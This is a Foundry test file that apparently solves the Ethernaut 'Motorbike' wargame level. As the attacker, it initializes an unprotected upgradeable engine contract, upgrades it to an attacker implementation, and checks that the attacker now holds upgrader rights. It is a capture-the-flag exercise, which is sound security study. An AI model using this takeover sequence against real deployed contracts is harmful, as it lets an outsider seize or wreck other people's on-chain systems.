// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {console, Test} from "@forge-std/Test.sol";

import {DeployMotorbikeScript} from "@script-0_6_x/25_DeployMotorbike.sol";
import {MotorbikeAttackerImp} from "@main-0_6_x/25_MotorbikeAttacker.sol";

contract MotorbikeTest is Test, DeployMotorbikeScript {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    address deployer = vm.addr(deployerPrivateKey);

    address public attacker = address(11);

    MotorbikeAttackerImp motorbikeAttackerImp;

    function setUp() public {

        vm.deal(attacker, 0.2 ether);
        vm.label(attacker, "Attacker");

        DeployMotorbikeScript.run();

    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        engine.initialize();        
        motorbikeAttackerImp = new MotorbikeAttackerImp();

        bytes memory initEncoded = abi.encodeWithSignature("initialize()");
        engine.upgradeToAndCall(address(motorbikeAttackerImp), initEncoded);

        assertEq(engine.upgrader(), address(attacker));

        vm.stopPrank(  );
    }

}